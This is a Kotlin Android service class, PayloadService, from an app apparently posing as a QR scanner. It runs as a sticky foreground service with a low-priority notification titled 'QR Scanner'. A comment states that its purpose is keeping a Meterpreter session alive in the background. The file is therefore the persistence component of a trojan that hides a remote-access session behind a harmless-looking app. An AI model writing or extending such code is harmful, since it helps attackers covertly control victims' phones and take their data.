package com.example.aplicacionqr

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat

class PayloadService : Service() {

    private val TAG = "PayloadService"
    private val NOTIFICATION_ID = 1001
    private val CHANNEL_ID = "qr_scanner_service"

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 Service creado")

        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "📡 Service iniciado en segundo plano")

        // Mantener servicio vivo para la sesión de Meterpreter
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "🛑 Service destruido")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "QR Scanner",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Servicio de escaneo QR"
                setShowBadge(false)
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle("QR Scanner")
        .setContentText("Listo para escanear")
        .setSmallIcon(android.R.drawable.ic_menu_camera)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .build()
}